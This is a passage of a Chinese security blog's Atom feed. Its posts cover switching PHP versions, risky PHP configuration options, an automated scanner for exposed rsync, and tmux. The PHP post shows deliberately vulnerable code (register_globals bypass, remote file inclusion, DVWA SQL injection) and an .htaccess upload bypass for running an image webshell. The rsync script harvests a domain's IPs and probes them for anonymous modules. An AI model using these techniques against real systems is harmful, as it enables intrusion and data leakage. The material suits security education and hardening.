      <category term="Linux" scheme="http://xkon.githb.io/tags/Linux/"/>
    
      <category term="Reverse Shell" scheme="http://xkon.githb.io/tags/Reverse-Shell/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP多版本切换]]></title>
    <link href="http://xkon.githb.io/2015/07/04/PHP%E5%A4%9A%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2/"/>
    <id>http://xkon.githb.io/2015/07/04/PHP多版本切换/</id>
    <published>2015-07-04T02:44:26.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p>在测试的时候，需要用到某一个特定的PHP版本，是很常见的问题，所以在机器上安装多个php版本共存是很有必要的。如何找到一个方便的方法切换版本是一个问题，好在早就有人为我们解决了。本篇记录在Kali Linux上借助<a href="https://github.com/phpbrew/phpbrew" target="_blank" rel="external">phpbrew</a>实现多个php版本共存切换的问题。</p>
<a id="more"></a>
<p><strong>安装依赖</strong></p>
<p>参见官方的<a href="https://github.com/phpbrew/phpbrew/wiki/Requirement" target="_blank" rel="external">Requirement</a></p>
<p>Kali 上安装：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get build-dep php5</span><br><span class="line">apt-get install -y php5 php5-dev php-pear autoconf automake curl build-essential libxslt1-dev re2c libxml2 libxml2-dev php5-cli bison libbz2-dev libreadline-dev</span><br><span class="line">apt-get install -y libfreetype6 libfreetype6-dev libpng12-<span class="number">0</span> libpng12-dev libjpeg-dev libjpeg8-dev libjpeg8  libgd-dev libgd3 libxpm4 libltdl7 libltdl-dev</span><br><span class="line">apt-get install -y libssl-dev openssl</span><br><span class="line">apt-get install -y gettext libgettextpo-dev libgettextpo0</span><br><span class="line">apt-get install -y libicu-dev</span><br><span class="line">apt-get install -y libmhash-dev libmhash2</span><br><span class="line">apt-get install -y libmcrypt-dev libmcrypt4</span><br></pre></td></tr></table></figure>
<p><code>libgd3</code>软件包可能装不上，但是好像也不影响使用。</p>
<p><strong>安装phpbrew</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L -O https://github.com/phpbrew/phpbrew/raw/master/phpbrew</span><br><span class="line">chmod +x phpbrew</span><br><span class="line">sudo mv phpbrew /usr/bin/phpbrew</span><br></pre></td></tr></table></figure>
<p>然后初始化：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew init</span><br></pre></td></tr></table></figure>
<p>在<code>.bashrc</code>中加入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PHPBREW_SET_PROMPT=1 设置bash提示符中显示当前使用php版本</span></span><br><span class="line"><span class="built_in">export</span> PHPBREW_SET_PROMPT=<span class="number">1</span></span><br><span class="line"><span class="built_in">source</span> ~/.phpbrew/bashrc</span><br></pre></td></tr></table></figure>
<p><strong>简单使用</strong></p>
<ul>
<li>查看有哪些版本可以安装</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新</span></span><br><span class="line">phpbrew update --old</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出具体版本</span></span><br><span class="line">phpbrew known</span><br></pre></td></tr></table></figure>
<ul>
<li><p>安装特定版本的PHP</p>
<ul>
<li>Apache</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew install <span class="number">5.6</span>.<span class="number">10</span> +default +apxs2=/usr/bin/apxs2</span><br></pre></td></tr></table></figure>
<p><code>+default</code>为以默认方式编译安装<br><code>+apxs2=/usr/bin/apxs2</code>是为了在切换PHP版本时，Apache也能同时切换到此版本</p>
<ul>
<li>Nginx</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew install <span class="number">5.6</span>.<span class="number">10</span> +default +fpm</span><br></pre></td></tr></table></figure>
<p><code>+fpm</code> Nginx 环境下切换时，需要<code>fpm</code>模块</p>
</li>
<li><p>临时使用</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew use php-<span class="number">5.6</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>切换默认版本</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew switch php-<span class="number">5.6</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看已经安装了哪些版本</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpbrew list</span><br></pre></td></tr></table></figure>
<p><strong>测试</strong></p>
<p>注意：在phpbrw切换版本后，在命令行上是直接生效的，但是apache需要重启才能生效</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/php5.1.6.png" alt=""><br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/php5.6.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在测试的时候，需要用到某一个特定的PHP版本，是很常见的问题，所以在机器上安装多个php版本共存是很有必要的。如何找到一个方便的方法切换版本是一个问题，好在早就有人为我们解决了。本篇记录在Kali Linux上借助<a href="https://github.com/phpbrew/phpbrew">phpbrew</a>实现多个php版本共存切换的问题。</p>]]>
    
    </summary>
    
      <category term="Kali" scheme="http://xkon.githb.io/tags/Kali/"/>
    
      <category term="php" scheme="http://xkon.githb.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP的一些配置可能导致的安全隐患]]></title>
    <link href="http://xkon.githb.io/2015/07/02/php%E9%85%8D%E7%BD%AE/"/>
    <id>http://xkon.githb.io/2015/07/02/php配置/</id>
    <published>2015-07-02T03:54:00.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<h2 id="php配置文件">php配置文件</h2><p>PHP的配置选项可参考<a href="http://php.net/manual/zh/configuration.php" target="_blank" rel="external">官网的PHP运行时配置</a>，配置文件有<code>php.ini</code>，<code>httpd.conf</code>，<code>.htaccess</code>等。最常见也是正宗的PHP的配置文件为<code>php.ini</code>，一般在php安装目录下，也可以通过<code>phpinfo()</code>和<code>get_cfg_var()</code>查看配置文件的路径。在Debian下PHP跟Apache搭配时，配置文件为<code>/etc/php5/apache2/php.ini</code>。</p>
<p>php.ini设置的选项是对Web服务器所有脚本生效。httpd.conf其实是apache的配置文件，但是里面的选项也可以影响到PHP的设置，并且其设置的选项是对该定义的目录下所有脚本生效。.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。要使.htaccess的配置能生效需要在httpd.conf文件中启用<code>AllowOverride</code>和<code>载入rewrite模块</code>。</p>
<p>PHP的配置是很灵活的，一不小心开启了一些不必要的php配置选项可能会带来敏感信息泄漏、SQL注射、远程包含等安全问题。规范的安全配置可保障最基本的安全环境。</p>
<a id="more"></a>
<h2 id="php-ini_配置文件中的选项">php.ini 配置文件中的选项</h2><p>下面介绍一些php.ini文件中易造成漏洞的选项。</p>
<ul>
<li><p>Expose_php = On    泄露php的版本信息</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/expose_php.png" alt="PHP版本信息泄露"></p>
<p>由于各个版本的一些特性，会造成一些漏洞只在某些PHP的版本中有效，所以当得到PHP的版本信息时，如果版本过高，就知道某些技巧就不适用了。    如0字节截断已经在php5.3.4中修复了，故高于5.4.3的版本中都不存在0字节截断问题。</p>
</li>
<li><p>一些调试选项，造成信息泄露</p>
<ul>
<li>display_errors=On</li>
<li>error_reporting = E_ALL&amp; ~E_NOTICE</li>
<li>display_startup_errors =On</li>
</ul>
<p>在开发时一般会打开调试选项，但在正式上线时必须要将这些选项禁用了以免造成信息的泄露。</p>
</li>
<li><p>register_globals = on 造成变量覆盖等</p>
<p>register_globals从PHP4.2.0开始有On默认改为Off，并从PHP5.3起废    弃并将自 PHP 5.4.0 起移除。<br>PHP在进程启动时，会根据<code>register_globals</code>的设置，判断是否将<code>$_GET</code>、    <code>$_POST</code>、<code>$_COOKIE</code>、<code>$_ENV、$_SERVER</code>、<code>$REQUEST</code>等数组变量里的内容自动注册为全局变量。<br>如下面代码：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">// 当用户合法的时候，赋值 $authorized = true</span></span><br><span class="line"><span class="keyword">if</span> (authenticated_user()) &#123;</span><br><span class="line">    <span class="variable">$authorized </span>= <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 由于并没有事先把 $authorized 初始化为 false，</span></span><br><span class="line"><span class="comment">// 当 register_globals 打开时，可能通过GET auth.php?authorized=1 来定义该变量值</span></span><br><span class="line"><span class="comment">// 所以任何人都可以绕过身份验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$authorized</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"/highly/sensitive/data.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>Allow_url_fopen = On</code> ，<code>Allow_url_include = On</code> 可能造成任意代码执行激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象例如文件，配合文件包含漏洞，可能造成任意代码执行，并直接getshell。<br>当使用了远程文件打开，并且又包含文件，并且文件又可以有用户控制的话，    则会有严重的安全隐患，如下测试。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$lib </span>= <span class="variable">$_GET</span>[‘dir’];</span><br><span class="line"><span class="keyword">include</span> <span class="string">"$lib/config.php"</span>;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/getshell2.png" alt="远程文件包含getshell"></p>
<p>  直接getshell!</p>
<ul>
<li><p><code>magic_quotes_gpc = on</code> 能在一定程度上防止SQL注入</p>
<p><code>magic-quotes-gpc</code>为 GPC (Get/Post/Cookie) 操作设置 <code>magic_quotes</code> 状态。 当 magic_quotes 为 on，所有的 ‘ (单引号)、” (双引号)、\（反斜    杠）和 NUL’s 被一个反斜杠自动转义。自PHP 5.3.0 起这个配置特性废弃并将自 PHP 5.4.0 起移除。</p>
<p>DVWA中的代码示例如下，没有对输入进行任何的过滤，造成了典型的SQL注入，但是当打开了魔术引号可以在一定程度上防止SQL注入。</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span>     </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>]))&#123; </span><br><span class="line">    <span class="comment">// Retrieve data </span></span><br><span class="line">    <span class="variable">$id </span>= <span class="variable">$_GET</span>[<span class="string">'id'</span>]; </span><br><span class="line">    <span class="variable">$getid </span>= <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>; </span><br><span class="line">    <span class="variable">$result </span>= mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="variable">$num </span>= mysql_numrows(<span class="variable">$result</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$i </span>= <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i </span>&lt; <span class="variable">$num</span>) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="variable">$first </span>= mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">"first_name"</span>); </span><br><span class="line">        <span class="variable">$last </span>= mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">"last_name"</span>); </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . <span class="variable">$id </span>. <span class="string">'&lt;br&gt;First name: '</span> . <span class="variable">$first </span>. <span class="string">'&lt;br&gt;Surname: '</span> . <span class="variable">$last</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="-htaccess突破文件上传">.htaccess突破文件上传</h2><p>.htaccess文件提供了针对每个目录改变配置的方法，所以有利用.htaccess文件来突破文件上传拿shell的。这里利用时有一个条件就是上传的文件名得不变。</p>
<p>利用过程为</p>
<ol>
<li>上传.htaccess文件，其中文件中填入<code>AddType application/x-httpd-php  .jpg</code></li>
<li>上传图片马</li>
</ol>
<p>原理就是利用.htaccess文件控制解析 jpg文件为php程序。</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/B_uLEABQDH397.jpg" alt=""></p>
<h2 id="参考">参考</h2><p>《白帽子讲Web安全》以及网络上的各篇文章，太多了就不一一列举，统一感谢之。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="php配置文件">php配置文件</h2><p>PHP的配置选项可参考<a href="http://php.net/manual/zh/configuration.php">官网的PHP运行时配置</a>，配置文件有<code>php.ini</code>，<code>httpd.conf</code>，<code>.htaccess</code>等。最常见也是正宗的PHP的配置文件为<code>php.ini</code>，一般在php安装目录下，也可以通过<code>phpinfo()</code>和<code>get_cfg_var()</code>查看配置文件的路径。在Debian下PHP跟Apache搭配时，配置文件为<code>/etc/php5/apache2/php.ini</code>。</p>
<p>php.ini设置的选项是对Web服务器所有脚本生效。httpd.conf其实是apache的配置文件，但是里面的选项也可以影响到PHP的设置，并且其设置的选项是对该定义的目录下所有脚本生效。.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。要使.htaccess的配置能生效需要在httpd.conf文件中启用<code>AllowOverride</code>和<code>载入rewrite模块</code>。</p>
<p>PHP的配置是很灵活的，一不小心开启了一些不必要的php配置选项可能会带来敏感信息泄漏、SQL注射、远程包含等安全问题。规范的安全配置可保障最基本的安全环境。</p>]]>
    
    </summary>
    
      <category term="php" scheme="http://xkon.githb.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[rsync信息泄露自动化扫描]]></title>
    <link href="http://xkon.githb.io/2015/05/31/rsync%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F/"/>
    <id>http://xkon.githb.io/2015/05/31/rsync信息泄露自动化扫描/</id>
    <published>2015-05-31T04:54:21.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<h2 id="Rsync">Rsync</h2><p>rsync（remote synchronize）是一款实现远程同步功能的软件。当配置不当允许匿名访问时会有信息泄露的隐患。</p>
<p>nmap 扫描<br><code>nmap -n --open -p 873 x.x.x.x/24</code></p>
<p>测试<br><code>rsync x.x.x.x::</code></p>
<p>下载<br><code>rsync -vzrtopg --progress --delete username@xxx.xxx.xxx.xxx::out /home/test/getfile</code></p>
<p>上传文件<br><code>rsync -vzrtopg --progress /home/test/getfile username@xxx.xxx.xxx.xxx::out</code></p>
<a id="more"></a>
<p>##自动化扫描</p>
<p>借助fofa的根域名网段透视，得到某域名及其子域名下所有IP，放入程序中扫描。<br>抓fofa数据的实现使用了猪猪侠的<a href="https://github.com/ring04h/wydomain" target="_blank" rel="external">wydomain</a>的<code>fofaplugin.py</code>，wydomain堪称神器，推荐！附上代码，写的略粗糙</p>
<p><img src="http://7xi3ed.com1.z0.glb.clouddn.com/rrr.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding=utf-8</span></span><br><span class="line"><span class="comment"># author=xk0n</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''当需要交互输入密码时，subprocess是不合适的,可以选用pexpect'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> fofaplugin</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_rsync_port</span><span class="params">(ipaddr)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] scaning IP:'</span>, ipaddr</span><br><span class="line">    scan = Popen(</span><br><span class="line">        [<span class="string">'nmap'</span>, <span class="string">'-n'</span>, <span class="string">'--open'</span>, <span class="string">'-p'</span>, <span class="string">'873'</span>, ipaddr], stdout=PIPE)</span><br><span class="line">    scan.wait()</span><br><span class="line">    <span class="comment"># re compile IPaddress</span></span><br><span class="line">    re_ip = re.compile(<span class="string">r'(?&lt;![\.\d])(?:\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;(?![\.\d])'</span>)</span><br><span class="line"></span><br><span class="line">    port_opened_ip = [re_ip.findall(line)[<span class="number">0</span>]</span><br><span class="line">                      <span class="keyword">for</span> line <span class="keyword">in</span> scan.stdout <span class="keyword">if</span> re_ip.findall(line)]</span><br><span class="line">    <span class="keyword">return</span> port_opened_ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_vul</span><span class="params">(ipaddr)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> ipaddr:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[*] Testing %s'</span> % ipaddr</span><br><span class="line">        case = Popen(</span><br><span class="line">            [<span class="string">'rsync %s::'</span> % ipaddr], shell=<span class="keyword">True</span>, stdout=PIPE)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> case.stdout:</span><br><span class="line">            <span class="keyword">if</span> m.split():</span><br><span class="line">                cmd = <span class="string">'rsync %s::%s'</span> % (ipaddr, m.split()[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"\n[*] Executing %s"</span> % cmd</span><br><span class="line">                test = Popen(</span><br><span class="line">                    cmd, shell=<span class="keyword">True</span>, stdout=PIPE, stderr=PIPE, stdin=PIPE)</span><br><span class="line">                out,err = test.communicate()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"access denied"</span> <span class="keyword">in</span> err:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"[-] 访问时权限错误"</span></span><br><span class="line">                <span class="comment"># elif 'Password' in test.stdout:</span></span><br><span class="line">                <span class="comment">#     print "It needed password!"</span></span><br><span class="line">                <span class="comment">#     test.stdin.write(b'123456')</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'[*] %s is maybe Vulnerable!!'</span> % ipaddr</span><br><span class="line">                    <span class="keyword">if</span> ipaddr <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                        result.append(ipaddr)</span><br><span class="line">                    <span class="keyword">print</span> out</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] ipaddr is None\n    Next!'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># fofaplugin use </span></span><br><span class="line">all_domain = fofaplugin.start_fofa_plugin(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'%s_domain.json'</span>%sys.argv[<span class="number">1</span>],<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(json.dumps(all_domain))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> all_domain[<span class="string">'partner'</span>]:</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> all_domain[<span class="string">'partner'</span>][item][<span class="string">'ipaddrs'</span>]:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> scan_rsync_port(ip):</span><br><span class="line">            test_vul(each)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    outFile=sys.argv[<span class="number">1</span>]+<span class="string">'_rsync_vul.txt'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] 写入文件%s中&gt;&gt;&gt;'</span>%outFile</span><br><span class="line">    <span class="keyword">with</span> open(outFile, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> result:</span><br><span class="line">            f.write(line+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] Done!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[-] 没有发现有问题的IP"</span></span><br></pre></td></tr></table></figure>
<h2 id="防护">防护</h2><p>参考<a href="http://drops.wooyun.org/papers/161" target="_blank" rel="external">Rsync安全配置</a></p>
<p>##扩展</p>
<p><a href="http://drops.wooyun.org/papers/410" target="_blank" rel="external">从乌云看运维安全那点事儿 | WooYun知识库 </a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Rsync">Rsync</h2><p>rsync（remote synchronize）是一款实现远程同步功能的软件。当配置不当允许匿名访问时会有信息泄露的隐患。</p>
<p>nmap 扫描<br><code>nmap -n --open -p 873 x.x.x.x/24</code></p>
<p>测试<br><code>rsync x.x.x.x::</code></p>
<p>下载<br><code>rsync -vzrtopg --progress --delete username@xxx.xxx.xxx.xxx::out /home/test/getfile</code></p>
<p>上传文件<br><code>rsync -vzrtopg --progress /home/test/getfile username@xxx.xxx.xxx.xxx::out</code></p>]]>
    
    </summary>
    
      <category term="python" scheme="http://xkon.githb.io/tags/python/"/>
    
      <category term="扫描" scheme="http://xkon.githb.io/tags/%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[tmux]]></title>
    <link href="http://xkon.githb.io/2015/05/19/tmux/"/>
    <id>http://xkon.githb.io/2015/05/19/tmux/</id>
    <published>2015-05-19T13:31:31.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p>tmux 是一个终端复用软件，当用ssh登陆时会非常有用。为了做到复用，其使用了三个概念<code>session</code>、<code>window</code>、<code>pane</code>。可以把一个主题作为一个session，比如工作环境作为一个session，娱乐时另开一个session。一个session包含多个window，一个window就像一个标签页。一个window可以包含多个pane，就相当于把一个屏幕分成了多个区域，一个区域可以作为一个shell。<br><a id="more"></a><br><img src="http://7xi3ed.com1.z0.glb.clouddn.com/tmux.png" alt="tmux"><br>下面的是powerline状态栏，显示了session，和window。</p>
<p>##三个基本概念</p>
<ul>
<li>会话（session）</li>
<li>窗口（window）</li>
<li>面板（pane）</li>
</ul>
<p>一个会话包含多个窗口，一个窗口包含多个面板pane。</p>
<p>##命令与快捷键备忘</p>
<p>默认的<code>prefix</code>为<code>C-b</code><br>可以在<code>.tmux.conf</code>文件中自定义：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置前缀为Ctrl + a</span></span><br><span class="line"><span class="built_in">set</span> -g prefix C<span class="operator">-a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解除Ctrl+b 与前缀的对应关系</span></span><br><span class="line">unbind C-b</span><br><span class="line"></span><br><span class="line"><span class="comment">#copy-mode 将快捷键设置为vi 模式</span></span><br><span class="line">setw -g mode-keys vi</span><br><span class="line"><span class="built_in">bind</span>-key -t vi-copy <span class="string">'v'</span> begin-selection</span><br><span class="line"><span class="built_in">bind</span>-key -t vi-copy <span class="string">'y'</span> copy-selection</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>会话</p>
<p><code>tmux new -s sessionname</code>创建一个session<br><code>tmux ls</code>列出会话</p>
<p><code>prefix s</code>列出会话<br><code>prefix d</code>deattach 退出，但是session仍然存在后台<br><code>tmux attach -t sessionname</code>进入session<br><code>prefix $</code>重命名session</p>
</li>
<li><p>窗口</p>
<p><code>prefix c</code>创建一个新窗口<br><code>prefix &amp;</code>关闭当前窗口<br><code>prefix w</code>列出当前session的所有窗口<br><code>prefix p</code>切换到上一个窗口<br><code>prefix n</code>切换到下一个窗口<br><code>prefix f</code>搜索所有窗口<br><code>prefix b</code>重命名当前窗口</p>
</li>
<li><p>面板</p>
<p><code>prefix &quot;</code>横向分割<br><code>prefix %</code>纵向分割<br><code>prefix 方向键</code>在各个pane间移动<br><code>prefix x</code>关闭当前pane<br><code>prefix o</code>到下一个pane</p>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>tmux 是一个终端复用软件，当用ssh登陆时会非常有用。为了做到复用，其使用了三个概念<code>session</code>、<code>window</code>、<code>pane</code>。可以把一个主题作为一个session，比如工作环境作为一个session，娱乐时另开一个session。一个session包含多个window，一个window就像一个标签页。一个window可以包含多个pane，就相当于把一个屏幕分成了多个区域，一个区域可以作为一个shell。<br>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://xkon.githb.io/tags/Linux/"/>
    
      <category term="tmux" scheme="http://xkon.githb.io/tags/tmux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[内网渗透小tricks]]></title>
    <link href="http://xkon.githb.io/2015/04/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8Ftricks/"/>
    <id>http://xkon.githb.io/2015/04/17/内网渗透小tricks/</id>
    <published>2015-04-17T09:34:53.000Z</published>
    <updated>2015-10-14T03:53:01.000Z</updated>
    <content type="html"><![CDATA[<p>##0x00 处在内网中我们能干的事</p>
